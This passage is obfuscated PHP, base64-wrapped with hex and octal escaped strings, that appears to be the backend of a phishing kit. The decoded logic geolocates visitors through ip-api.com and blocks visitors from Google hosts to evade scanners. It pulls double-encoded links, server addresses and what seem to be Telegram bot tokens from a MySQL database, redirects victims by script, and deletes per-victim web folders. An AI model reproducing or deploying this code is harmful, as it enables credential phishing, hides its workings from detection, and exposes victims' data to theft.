XHg3M1x4NzRcMTQxXDE2NFwxNjVceDczIiA9PiAiXDE2M1wxNjVcMTQzXDE0M1x4NjVcMTYzXHg3MyIsICJcMTQyXHg2MVx4NjNcMTUzXHg1ZlwxNDRcMTUxXHg3MiIgPT4gJGZvbGRlcl9wYXRoLCAiXDE0MlwxNDFceDYzXDE1M1wxMzdceDc1XDE2MlwxNTQiID0+ICRuZXh0ZG9tYWluLCAiXHg2MlwxNDFceDYzXDE1M1wxMzdcMTUxXDE0NCIgPT4gJHNob3BpZCwgIlx4NmRceDY1XDE2M1wxNjNceDYxXDE0N1x4NjUiID0+ICJceDQ0XDE0MVx4NzRcMTQxXDQwXDE2Mlx4NjVcMTQzXHg2NVwxNTFceDc2XDE0NVx4NjRcNDBcMTYzXHg3NVx4NjNcMTQzXDE0NVx4NzNceDczXHg2NlwxNjVceDZjXHg2Y1x4NzkiKTsgJHJlc3BvbnNlSnNvbiA9IGpzb25fZW5jb2RlKCRyZXNwb25zZURhdGEpOyBlY2hvICRyZXNwb25zZUpzb247IH0gZWxzZSB7IGh0dHBfcmVzcG9uc2VfY29kZSg0MDApOyBlY2hvICJceDRkXHg2OVwxNjNceDczXDE1MVx4NmVcMTQ3XDQwXDE2Mlx4NjVceDcxXDE2NVwxNTFcMTYyXDE0NVx4NjRceDIwXDE0NFwxNDFceDc0XHg2MSI7IH0gfSBlbHNlIHsgaHR0cF9yZXNwb25zZV9jb2RlKDQwNSk7IGVjaG8gIlx4NDlcMTU2XDE2Nlx4NjFcMTU0XHg2OVwxNDRcNDBceDcyXDE0NVwxNjFceDc1XDE0NVx4NzNcMTY0XHgyMFwxNTVceDY1XHg3NFx4NjhceDZmXHg2NCI7IH0gZ290byBoM05PcTsgYXFIQzc6IGluaV9zZXQoIlx4NjRceDY5XHg3M1wxNjBcMTU0XHg2MVx4NzlceDVmXDE0NVwxNjJcMTYyXDE1N1x4NzJceDczIiwgMSk7IGdvdG8gTHdBdl87IFpuVUFEOiBlcnJvcl9yZXBvcnRpbmcoRV9BTEwpOyBnb3RvIGFxSEM3OyBWYjdjTzogaWYgKGlzc2V0KCRfUE9TVFsiXHg2Y1x4NmZcMTQzXDE0MVwxNTRceDY5XHg3MCJdKSkgeyAkbXlpcHMgPSBiYXNlNjRfZGVjb2RlKGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJceDZjXDE1N1wxNDNcMTQxXDE1NFx4NjlceDcwIl0pKTsgJF9TRVNTSU9OWyJceDZjXHg2Zlx4NmNceDY5XDE2MFwxNjMiXSA9ICRteWlwczsgJFN0cnVwTG9tID0gJG15aXBzOyB9IGdvdG8gVmhHckg7IHBiZjhEOiBpZiAoaXNzZXQoJF9HRVRbIlx4NjVcMTU2XHg2NFwxNTVceDY1XHg2Y1x4NzVcMTcwIl0pKSB7ICRyZWRpID0gJF9DT09LSUVbIlwxNjJceDY1XHg2NFwxNTFcMTYyXDE1MVx4NjNcMTY0Il07ICR2ZGlyID0gJF9HRVRbIlx4NjVcMTU2XDE0NFwxNTVcMTQ1XHg2Y1wxNjVcMTcwIl07ICRkaXJlY3RvcnlUb0RlbGV0ZSA9ICJcMTY3XHg2NVwxNDJcNTciIC4gJHZkaXI7IGlmIChpc19kaXIoJGRpcmVjdG9yeVRvRGVsZXRlKSkgeyBpZiAoZGVsZXRlRGlyZWN0b3J5bmV3KCRkaXJlY3RvcnlUb0RlbGV0ZSkpIHsgfSB9IGVjaG8gIlx4M2NceDczXHg2M1wxNjJceDY5XHg3MFx4NzRcNDBcMTE0XDEwMVx4NGVceDQ3XDEyNVwxMDFceDQ3XHg0NVx4M2RceDI3XHg0YVwxNDFcMTY2XDE0MVx4NTNceDYzXHg3MlwxNTFceDcwXDE2NFx4MjdcNzZcMTJceDIwXDQwXHgyMFw0MFx4NzdcMTUxXHg2ZVx4NjRcMTU3XHg3N1x4MmVceDZjXHg2Zlx4NjNcMTQxXHg3NFwxNTFceDZmXHg2ZVw1Nlx4NjhceDcyXDE0NVwxNDZcNzVceDI3eyRyZWRpfVw0N1w3M1x4YVw0MFw0MFx4MjBceDIwXDc0XDU3XDE2M1x4NjNcMTYyXDE1MVwxNjBcMTY0XHgzZSI7IGRpZTsgfSBnb3RvIHRaQzFKOyBIS2lPbjogY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyBnb3RvIEEzZ1VJOyBpUTRuMTogJGRhdGFsb2cgPSBiYXNlNjRfZGVjb2RlKCJcMTQ1XDE1NVx4NTZceDc5XDE0MlwxNzFceDMxXHg2YlwxMzFcMTMwXHg2Ylx4NzVceDYzXDYyXDE1MFwxNjZceDYzXHg0MSIpOyBnb3RvIHJYb19KOyBWaEdySDogJHByb3RvY29sID0gaXNzZXQoJF9TRVJWRVJbIlx4NDhceDU0XDEyNFx4NTBceDUzIl0pICYmICRfU0VSVkVSWyJceDQ4XHg1NFwxMjRceDUwXHg1MyJdID09PSAiXHg2ZlwxNTYiID8gIlwxNTBceDc0XDE2NFx4NzBceDczIiA6ICJcMTUwXDE2NFwxNjRcMTYwIjsgZ290byBidkc5MDsgUjZVRFg6ICRSYW5kT1BfTWx1eCA9IFJhbmRfWERfVEYocmFuZCg0LCAxMCkpOyBnb3RvIFVwQkNyOyBoTElwRjogJGN1cmwgPSBjdXJsX2luaXQoJHVybCk7IGdvdG8gSEtpT247IHdIWndQOiAkT0tKSVZHUkQgPSBIWVRfRERSX1VpbygkdXNlckFnZW50KTsgZ290byBvbmdjZjsgdzZXUE06IGZ1bmN0aW9uIGRlbGV0ZURpcmVjdG9yeW5ldygkZGlyKSB7IGlmICghZmlsZV9leGlzdHMoJGRpcikpIHsgcmV0dXJuIHRydWU7IH0gaWYgKCFpc19kaXIoJGRpcikpIHsgcmV0dXJuIHVubGluaygkZGlyKTsgfSBmb3JlYWNoIChzY2FuZGlyKCRkaXIpIGFzICRpdGVtKSB7IGlmICgkaXRlbSA9PSAiXHgyZSIgfHwgJGl0ZW0gPT0gIlx4MmVcNTYiKSB7IGNvbnRpbnVlOyB9IGlmICghZGVsZXRlRGlyZWN0b3J5bmV3KCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGl0ZW0pKSB7IHJldHVybiBmYWxzZTsgfSB9IGlmIChybWRpcigkZGlyKSkgeyByZXR1cm4gdHJ1ZTsgfSBlbHNlIHsgcmV0dXJuIGZhbHNlOyB9IH0gZ290byB0eFl1RjsgYVVoOG86ICROb3B3dnYgPSBiYXNlNjRfZGVjb2RlKCJceDYzXHgzM1x4NTJceDc5XDE0Mlx4MzJcNjVceDZlXHg1OFw2MlwxMjJcMTUwXDE0NVx4NTEiKTsgZ290byBvVjE3UDsgY0tERng6ICRfU0VTU0lPTlsiXHg1Nlx4NmZceDcwXHg3Mlx4NzQiXSA9IGlzc2V0KCRpbmZvWyJcMTQzXHg2OVwxNjRceDc5Il0pID8gJGluZm9bIlx4NjNceDY5XHg3NFwxNzEiXSA6IG51bGw7IGdvdG8gV1kzZmE7IHdSRzdLOiAkTHJlZHN2diA9IGJhc2U2NF9kZWNvZGUoIlx4NWFcMTEwXDExMlx4NmFcMTMyXDYyXHg2Y1x4NzNcMTQ1XDEyNlx4NDFceDc3XHg0YlwxNTVcMTYzXDE1NSIpOyBnb3RvIGFVaDhvOyBvVjE3UDogJHVybCA9ICJceDY4XHg3NFx4NzRceDcwXDcyXDU3XHgyZlx4NjlceDcwXDU1XHg2MVx4NzBceDY5XHgyZVwxNDNcMTU3XHg2ZFx4MmZcMTYwXHg2OFwxNjBceDJmeyRTdHJ1cExvbX1cNzdcMTQ2XDE1MVx4NjVceDZjXDE0NFx4NzNceDNkXDE2M1x4NzRcMTQxXDE2NFwxNjVceDczXHgyY1wxNTVcMTQ1XDE2M1wxNjNceDYxXHg2N1x4NjVcNTRcMTQzXDE1N1wxNTZceDc0XDE1MVx4NmVcMTQ1XDE1NlwxNjRcNTRcMTQzXHg2ZlwxNTZcMTY0XDE1MVwxNTZceDY1XDE1NlwxNjRcMTAzXHg2Zlx4NjRcMTQ1XDU0XHg2M1x4NmZcMTY1XDE1NlwxNjRcMTYyXDE3MVw1NFx4NjNceDZmXHg3NVx4NmVceDc0XHg3MlwxNzFceDQzXHg2Zlx4NjRceDY1XDU0XHg3Mlx4NjVcMTQ3XHg2OVx4NmZcMTU2XHgyY1wxNjJceDY1XDE0N1x4NjlceDZmXHg2ZVx4NGVceDYxXDE1NVwxNDVcNTRcMTQzXHg2OVx4NzRceDc5XHgyY1wxNDRceDY5XHg3M1x4NzRceDcyXDE1MVwxNDNceDc0XHgyY1wxNzJceDY5XDE2MFx4MmNceDZjXHg2MVx4NzRcNTRcMTU0XDE1N1wxNTZcNTRcMTY0XDE1MVwxNTVceDY1XHg3YVwxNTdcMTU2XDE0NVx4MmNcMTQzXDE2NVwxNjJceDcyXHg2NVx4NmVcMTQzXHg3OVw1NFwxNTFcMTYzXHg3MFx4MmNceDZmXHg3Mlx4NjdcNTRcMTQxXHg3M1x4MmNceDYxXDE2M1wxNTZcMTQxXDE1NVx4NjVcNTRcMTYyXDE0NVx4NzZceDY1XDE2Mlx4NzNceDY1XHgyY1x4NmRceDZmXDE0MlwxNTFceDZjXDE0NVw1NFwxNjBcMTYyXHg2ZlwxNzBcMTcxXDU0XHg2OFwxNTdcMTYzXHg3NFx4NjlcMTU2XHg2N1x4MmNcMTYxXDE2NVwxNDVcMTYyXDE3MSI7IGdvdG8gaExJcEY7IFBMVEtaOiAkVElNRV9EQVRFID0gZGF0ZSgiXDEzMVw1NVwxNTVcNTVceDY0XHgyMFwxMTBcNzJceDY5XHgzYVx4NzMiKTsgZ290byBWYjdjTzsgeGJjN3k6IGlmIChpc3NldCgkX0dFVFsiXDE2NlwxNjNceDczIl0pKSB7ICRnYW1laWQgPSAkX0dFVFsiXHg3M1x4NmZcMTY1XHg2Y1wxNjMiXTsgJF9TRVNTSU9OWyJcMTU0XHg2Zlx4NmNcMTYzXDE1N1wxNjVceDZjXHg3MyJdID0gJGdhbWVpZDsgUkRJT1BCKCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2LCAkZ2FtZWlkKTsgJGZvbGRlcl9wYXRoeCA9ICRfR0VUWyJcMTY2XHg3M1x4NzMiXTsgJFJhbmRPUF9NbHV4ID0gUmFuZF9YRF9URihyYW5kKDQsIDEwKSk7IGVjaG8gIlw3NFwxNjNceDYzXDE2MlwxNTFceDcwXDE2NFx4MjBceDRjXDEwMVx4NGVceDQ3XDEyNVx4NDFceDQ3XDEwNVw3NVx4MjdceDRhXDE0MVx4NzZceDYxXHg1M1wxNDNceDcyXHg2OVwxNjBcMTY0XDQ3XDc2XDEyXDQwXHgyMFx4MjBceDIwXHg3N1x4NjlcMTU2XHg2NFwxNTdcMTY3XHgyZVx4NmNcMTU3XDE0M1x4NjFcMTY0XHg2OVx4NmZcMTU2XHgyZVx4NjhcMTYyXDE0NVwxNDZcNzVceDI3eyRmb2xkZXJfcGF0aHh9XDc3XHgyNlwxNjZceDYxXHg2Y1wxNTFceDY0XDc1eyRSYW5kT1BfTWx1eH17JFJhbmRPUF9NbHV4fVw0NlwxNDFcMTU0XHg2NVwxNjJceDc0XHgzZHskUmFuZE9QX01sdXh9XHgyNlwxNzBcMTU0XDE2MFwxNjNceDNkeyRSYW5kT1BfTWx1eH1cNDZceDczXHg2ZlwxNjVceDZjXHg3M1x4M2R7JGdhbWVpZH1cNDZceDY0XHg2ZlwxNTZceDY1XDc1XHgyNlx4NjVcMTYyXDE2MlwxNTdceDcyXHg3OVx4M2R7JFJhbmRPUF9NbHV4fVx4MjZceDZkXDE1Nlx4NjVcMTU1XHg2ZlwxNTZceDY5XHg2M1w3NVw0NlwxNTJcMTQyXDc1eyRSYW5kT1BfTWx1eH1cNDdceDNiXHhhXHgyMFx4MjBcNDBceDIwXHgzY1x4MmZcMTYzXDE0M1wxNjJcMTUxXDE2MFwxNjRceDNlIjsgZGllOyB9IGdvdG8gYkQ2TXI7IHRIQ185OiBmdW5jdGlvbiBGT3hfVEdIX1goJFVTRVJfQUdFTlQpIHsgJEJST1dTRVJfRVJST1IgPSAiXDEyNVwxNTZcMTUzXHg2ZVwxNTdceDc3XHg2ZVw0MFx4NDJcMTYyXHg2ZlwxNjdceDczXHg2NVwxNjIiOyAkQlJPV1NFUiA9IGFycmF5KCJceDJmXHg2ZFx4NzNceDY5XDE0NVx4MmZceDY5IiA9PiAiXHg0OVx4NmVceDc0XHg2NVx4NzJceDZlXHg2NVwxNjRceDIwXHg0NVx4NzhcMTYwXHg2Y1wxNTdceDcyXHg2NVwxNjIiLCAiXDU3XDE0NlwxNTFcMTYyXHg2NVwxNDZceDZmXHg3OFx4MmZcMTUxIiA9PiAiXDEwNlx4NjlcMTYyXHg2NVx4NjZcMTU3XHg3OCIsICJceDJmXHg3M1x4NjFceDY2XHg2MVx4NzJcMTUxXDU3XDE1MSIgPT4gIlwxMjNceDYxXHg2Nlx4NjFceDcyXDE1MSIsICJcNTdceDYzXDE1MFwxNjJcMTU3XDE1NVx4NjVcNTdceDY5IiA9PiAiXHg0M1wxNTBceDcyXDE1N1x4NmRcMTQ1IiwgIlx4MmZcMTQ1XDE0NFwxNDdcMTQ1XHgyZlwxNTEiID0+ICJceDQ1XDE0NFx4NjdceDY1IiwgIlw1N1wxNTdceDcwXHg2NVwxNjJceDYxXHgyZlx4NjkiID0+ICJcMTE3XDE2MFx4NjVcMTYyXHg2MSIsICJcNTdcMTU2XDE0NVwxNjRcMTYzXDE0M1wxNDFcMTYwXHg2NVw1N1x4NjkiID0+ICJceDRlXHg2NVx4NzRcMTYzXHg2M1x4NjFcMTYwXHg2NSIsICJcNTdceDZkXHg2MVwxNzBcMTY0XHg2OFwxNTdceDZlXDU3XHg2OSIgPT4gIlx4NGRcMTQxXHg3OFx4NzRcMTUwXDE1N1x4NmUiLCAiXDU3XDE1M1wxNTdceDZlXDE2MVx4NzVceDY1XHg3Mlx4NmZcMTYyXDU3XHg2OSIgPT4gIlx4NGJcMTU3XHg2ZVwxNjFceDc1XHg2NVwxNjJceDZmXHg3MiIsICJceDJmXDE1NVwxNTdcMTQyXHg2OVx4NmNceDY1XDU3XHg2OSIgPT4gIlx4NDhcMTQxXHg2ZVx4NjRceDY4XHg2NVx4NmNceDY0XHgyMFwxMDJceDcyXHg2ZlwxNjdceDczXHg2NVwxNjIiKTsgZm9yZWFjaCAoJEJST1dTRVIgYXMgJHJlZ2V4ID0+ICR2YWx1ZSkgeyBpZiAocHJlZ19tYXRjaCgkcmVnZXgsICRVU0VSX0FHRU5UKSkgeyAkQlJPV1NFUl9FUlJPUiA9ICR2YWx1ZTsgfSB9IHJldHVybiAkQlJPV1NFUl9FUlJPUjsgfSBnb3RvIGNHUXFTOyBibkVOZDogZnVuY3Rpb24gUkRJT1BCKCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2LCAkaWQpIHsgJGRiID0gbXlzcWxpX2Nvbm5lY3QoJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2KTsgaWYgKCEkZGIpIHsgZGllKCJcMTAzXDE1N1x4NmVcMTU2XDE0NVwxNDNceDc0XDE1MVwxNTdceDZlXDQwXHg2NlwxNDFceDY5XDE1NFwxNDVceDY0XDcyXHgyMCIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsgfSAkc3FsX3UgPSAiXDEyM1wxMDVcMTE0XDEwNVx4NDNceDU0XHgyMFx4MmFceDIwXHg0Nlx4NTJcMTE3XHg0ZFx4MjBcMTYyXDE0NVwxNDRcMTUxXDE2Mlx4NjNcMTY0XDE1MVx4NmZcMTU2XDQwXHg1N1x4NDhceDQ1XDEyMlx4NDVceDIwXDE1MVx4NjRcNzVcNDd7JGlkfVx4MjciOyAkcmVzX3UgPSBteXNxbGlfcXVlcnkoJGRiLCAkc3FsX3UpOyBpZiAobXlzcWxpX251bV9yb3dzKCRyZXNfdSkgPiAwKSB7IHdoaWxlICgkcm93ID0gbXlzcWxpX2ZldGNoX2FycmF5KCRyZXNfdSkpIHsgJF9TRVNTSU9OWyJcMTU0XDE1MVx4NmVcMTUzIl0gPSBiYXNlNjRfZGVjb2RlKGJhc2U2NF9kZWNvZGUoJHJvd1siXDE1NFx4NjlcMTU2XHg2YiJdKSk7ICRfU0VTU0lPTlsiXHg2M1x4NmUiXSA9IGV4cGxvZGUoIlw3MyIsIGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkcm93WyJceDYzXHg2Zlx4NzVcMTU2XHg3NFx4NzJcMTcxIl0pKSk7ICRfU0VTU0lPTlsiXHg3MFwxNTFcMTQzIl0gPSAkcm93WyJcMTYwXDE1MVwxNDMiXTsgJF9TRVNTSU9OWyJceDZkXDE2M1wxNDciXSA9IGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkcm93WyJcMTU1XDE2M1wxNDciXSkpOyAkX1NFU1NJT05bIlwxNDVcMTcwXHg3MCJdID0gJHJvd1siXHg2NVx4NzhcMTYwXHg2OVwxNjJceDY1Il07ICRfU0VTU0lPTlsiXDE2M1wxNDVceDcyXHg3NlwxNDVceDcyIl0gPSBiYXNlNjRfZGVjb2RlKGJhc2U2NF9kZWNvZGUoJHJvd1siXHg3M1x4NjVcMTYyXDE2Nlx4NjVceDcyIl0pKTsgJF9TRVNTSU9OWyJcMTY1XDE2Mlx4NmMiXSA9IGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkcm93WyJcMTY1XHg3MlwxNTQiXSkpOyAkX1NFU1NJT05bIlx4NmNcMTY1XHg3OFwxNDNcMTQxXHg3MFx4NzRcMTQzXHg2OFx4NjEiXSA9ICRyb3dbIlx4NmNcMTY1XHg3OFx4NjNcMTQxXHg3MFx4NzRcMTQzXDE1MFwxNDEiXTsgJF9TRVNTSU9OWyJceDc0XHg2Zlx4NmJceDY1XDE1Nlx4NzRceDY1XHg2YyJdID0gYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRyb3dbIlwxNjRceDZmXHg2Ylx4NjVcMTU2XHg3NFwxNDVceDZjIl0pKTsgJF9TRVNTSU9OWyJcMTUxXHg2NFwxNjRceDY1XDE1NCJdID0gYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRyb3dbIlwxNTFcMTQ0XDE2NFx4NjVcMTU0Il0pKTsgJF9TRVNTSU9OWyJcMTYyXHg2NVwxNDRcMTUxXHg3Mlx4NjlcMTQzXHg3NCJdID0gJHJvd1siXDE2MlwxNDVceDY0XDE1MVx4NzJcMTUxXHg2M1wxNjQiXTsgJF9TRVNTSU9OWyJcMTQxXHg3MFx4NjkiXSA9ICRyb3dbIlwxNDFcMTYwXHg2OSJdOyBpZiAoaXNzZXQoJF9HRVRbIlwxNjZceDczXHg3MyJdKSkgeyBzZXRjb29raWUoIlwxNjRcMTU3XHg2YlwxNDVcMTU2XHg3NFx4NjVceDZjIiwgJF9TRVNTSU9OWyJceDc0XHg2ZlwxNTNceDY1XDE1NlwxNjRcMTQ1XHg2YyJdLCB0aW1lKCkgKyA4NjQwMCAqIDMwLCAiXDU3Iik7IHNldGNvb2tpZSgiXHg2OVwxNDRceDc0XHg2NVx4NmMiLCAkX1NFU1NJT05bIlx4NjlcMTQ0XHg3NFx4NjVcMTU0Il0sIHRpbWUoKSArIDg2NDAwICogMzAsICJcNTciKTsgc2V0Y29va2llKCJceDcyXHg2NVwxNDRcMTUxXHg3Mlx4NjlcMTQzXDE2NCIsICRfU0VTU0lPTlsiXHg3Mlx4NjVcMTQ0XHg2OVx4NzJcMTUxXDE0M1wxNjQiXSwgdGltZSgpICsgODY0MDAgKiAzMCwgIlx4MmYiKTsgfSB9IH0gZWxzZSB7ICRyZWZpeCA9ICJcMTIzXHg1MVwxMTRceDIwXDExMVwxMDRceDIwXHg0OVx4NmVceDc2XDE0MVx4NmNceDY5XDE0NFx4MjB7JGlkfSI7IGNsaWNrX1RZcXcoJFN0cnVwTG9tLCAkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYsICRyZWZpeCk7IGRpZTsgfSBteXNxbGlfY2xvc2UoJGRiKTsgfSBnb3RvIEVoZElBOyB0WkMxSjogaWYgKGlzc2V0KCRfR0VUWyJcMTU0XHg2ZlwxNTRcMTU1XDE0NSJdKSkgeyAkdmRpciA9ICRfR0VUWyJceDZjXHg2Zlx4NmNceDZkXDE0NSJdOyAkcmVmaXggPSAiXDExMVwxNTZceDc2XDE0MVwxNTRceDY5XHg2NFx4MjBceDZjXDE1N1wxNTRcMTU1XDE0NSI7ICRyZWRpID0gJF9DT09LSUVbIlwxNjJcMTQ1XDE0NFx4NjlceDcyXDE1MVx4NjNceDc0Il07IGNsaWNrX1RZcXcoJFN0cnVwTG9tLCAkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYsICRyZWZpeCk7ICRkaXJlY3RvcnlUb0RlbGV0ZSA9ICJceDc3XHg2NVwxNDJceDJmIiAuICR2ZGlyOyBpZiAoaXNfZGlyKCRkaXJlY3RvcnlUb0RlbGV0ZSkpIHsgaWYgKGRlbGV0ZURpcmVjdG9yeW5ldygkZGlyZWN0b3J5VG9EZWxldGUpKSB7IH0gfSBlY2hvICJcNzRceDczXDE0M1x4NzJceDY5XDE2MFx4NzRceDIwXHg0Y1x4NDFcMTE2XDEwN1wxMjVcMTAxXHg0N1wxMDVceDNkXDQ3XDExMlwxNDFceDc2XHg2MVwxMjNcMTQzXDE2Mlx4NjlcMTYwXHg3NFx4MjdcNzZcMTJcNDBceDIwXDQwXDQwXDE2N1wxNTFceDZlXDE0NFx4NmZceDc3XHgyZVx4NmNcMTU3XDE0M1x4NjFceDc0XDE1MVx4NmZceDZlXDU2XHg2OFx4NzJceDY1XDE0Nlx4M2RcNDd7JHJlZGl9XHgyN1w3M1wxMlx4MjBceDIwXDQwXDQwXHgzY1x4MmZcMTYzXDE0M1x4NzJceDY5XDE2MFwxNjRceDNlIjsgZGllOyB9IGdvdG8geGJjN3k7IHJYb19KOiAkRml4Ym9tID0gYmFzZTY0X2RlY29kZSgiXHg2M1w2M1x4NTJceDc5XHg2Mlx4MzJceDM1XHg2ZVwxMzBceDMyXDEyMlx4NjhcMTQ1XDEyMSIpOyBnb3RvIHdSRzdLOyBXWTNmYTogJF9TRVNTSU9OWyJcMTcwXHg0ZlwxNjBcMTY1XHg3OSJdID0gaXNzZXQoJGluZm9bIlwxNjJcMTQ1XHg2N1wxNTFcMTU3XDE1Nlx4NGVcMTQxXDE1NVx4NjUiXSkgPyAkaW5mb1siXHg3MlwxNDVceDY3XDE1MVwxNTdcMTU2XDExNlwxNDFceDZkXDE0NSJdIDogbnVsbDsgZ290byB3NldQTTsgRWhkSUE6IGZ1bmN0aW9uIFJhbmRfWERfVEYoJGxlbmd0aCkgeyAkY2hhcmFjdGVycyA9ICJceDYxXDE0Mlx4NjNcMTQ0XHg2NVx4NjZceDZhXHg2OFwxNTFcMTQ3XHg2Ylx4NmNcMTU1XDE1NlwxNTdcMTYwXHg3MVwxNjJcMTYzXHg3NFx4NzVcMTY2XHg3N1wxNzBceDc5XDE3Mlx4MzBcNjFceDMyXDYzXHgzNFx4MzVcNjZcNjdcNzBcNzFcMTAxXHg0MlwxMDNcMTA0XDEwNVwxMDZcMTA3XHg0OFx4NDlceDRhXHg0Ylx4NGNceDRkXHg0ZVx4NGZcMTIwXDEyMVx4NTJceDUzXHg1NFwxMjVceDU2XDEyN1wxMzBcMTMxXDEzMiI7ICRjaGFyYWN0ZXJzTGVuZ3RoID0gc3RybGVuKCRjaGFyYWN0ZXJzKTsgJHJhbmRvbVN0cmluZyA9ICcnOyBmb3IgKCRpID0gMDsgJGkgPCAkbGVuZ3RoOyAkaSsrKSB7ICRyYW5kb21TdHJpbmcgLj0gJGNoYXJhY3RlcnNbcmFuZCgwLCAkY2hhcmFjdGVyc0xlbmd0aCAtIDEpXTsgfSByZXR1cm4gJHJhbmRvbVN0cmluZzsgfSBnb3RvIENZWWN0OyB0eFl1RjogZnVuY3Rpb24gZGVsZXRlRGlyZWN0b3J5KCRkaXIpIHsgaWYgKCFmaWxlX2V4aXN0cygkZGlyKSkgeyByZXR1cm4gdHJ1ZTsgfSBpZiAoIWlzX2RpcigkZGlyKSkgeyByZXR1cm4gdW5saW5rKCRkaXIpOyB9ICR0aW1lX2RpZmYgPSB0aW1lKCkgLSBmaWxlY3RpbWUoJGRpcik7IGlmICgkdGltZV9kaWZmID4gMjkwKSB7IGZvcmVhY2ggKHNjYW5kaXIoJGRpcikgYXMgJGl0ZW0pIHsgaWYgKCRpdGVtID09ICJcNTYiIHx8ICRpdGVtID09ICJcNTZcNTYiKSB7IGNvbnRpbnVlOyB9IGlmICghZGVsZXRlRGlyZWN0b3J5KCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGl0ZW0pKSB7IHJldHVybiBmYWxzZTsgfSB9IGlmIChybWRpcigkZGlyKSkgeyByZXR1cm4gdHJ1ZTsgfSBlbHNlIHsgcmV0dXJuIGZhbHNlOyB9IH0gZWxzZSB7IHJldHVybiB0cnVlOyB9IH0gZ290byBiT1NlcjsgQlRjMnI6ICRpbmZvID0gdW5zZXJpYWxpemUoJHJlc3BvbnNlKTsgZ290byBCVEZwNjsgQks5UE46ICRfU0VTU0lPTlsiXDExNlx4NmFceDZmXHg3MFwxNDYiXSA9IGlzc2V0KCRpbmZvWyJceDYzXDE1N1wxNjVceDZlXDE2NFx4NzJceDc5XDEwM1x4NmZcMTQ0XHg2NSJdKSA/ICRpbmZvWyJceDYzXDE1N1wxNjVceDZlXHg3NFwxNjJcMTcxXDEwM1wxNTdcMTQ0XHg2NSJdIDogbnVsbDsgZ290byBjS0RGeDsgeld3SFI6IGlmIChzdHJwb3MoZ2V0aG9zdGJ5YWRkcigkU3RydXBMb20pLCAiXHg2N1x4NmZceDZmXDE0N1wxNTRceDY1IikgIT09IGZhbHNlKSB7ICRyZWZpeCA9ICJceDQyXDE1N1wxNjNcMTQ1XHgyMFx4NDdcNDBceDMyIjsgY2xpY2tfVFlxdygkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJHJlZml4KTsgZGllOyB9IGdvdG8gcE00eDc7IExVcjdaOiAkU3RydXBMb20gPSAkaXBQb3J0QXJyYXlbMF07IGdvdG8gc2FFQ2o7IGMwelRiOiAkZG9uZmxhZyA9ICRwcm90b2NvbCAuICJcNzJcNTdceDJmIiAuICRkb21haW47IGdvdG8gaVE0bjE7IGgzTk9xOiA=')); ?>
